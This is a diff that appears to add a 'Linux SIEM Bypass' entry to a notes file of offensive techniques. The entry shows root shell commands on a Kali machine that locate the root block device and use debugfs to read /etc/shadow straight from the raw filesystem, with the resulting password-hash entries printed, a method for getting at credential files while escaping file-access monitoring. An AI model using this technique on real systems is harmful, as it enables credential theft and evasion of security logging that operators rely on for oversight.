@@ -332,3 +332,26 @@ if ($retval) {
 }
 ?>
 ```
+
+# Linux SIEM Bypass:
+
+```bash
+┌──(root㉿kali)-[~]
+└─# df /   
+Filesystem     1K-blocks     Used Available Use% Mounted on
+/dev/sda1       31861548 16932968  13284548  57% /
+```           
+
+```bash
+┌──(root㉿kali)-[~]
+└─# debugfs /dev/sda1
+debugfs 1.46.6 (1-Feb-2023)
+debugfs:  cd /etc
+debugfs:  cat shadow
+root:!:19436:0:99999:7:::
+daemon:*:19436:0:99999:7:::
+bin:*:19436:0:99999:7:::
+sys:*:19436:0:99999:7:::
+sync:*:19436:0:99999:7:::
+games:*:19436:0:99999:7:::
+```
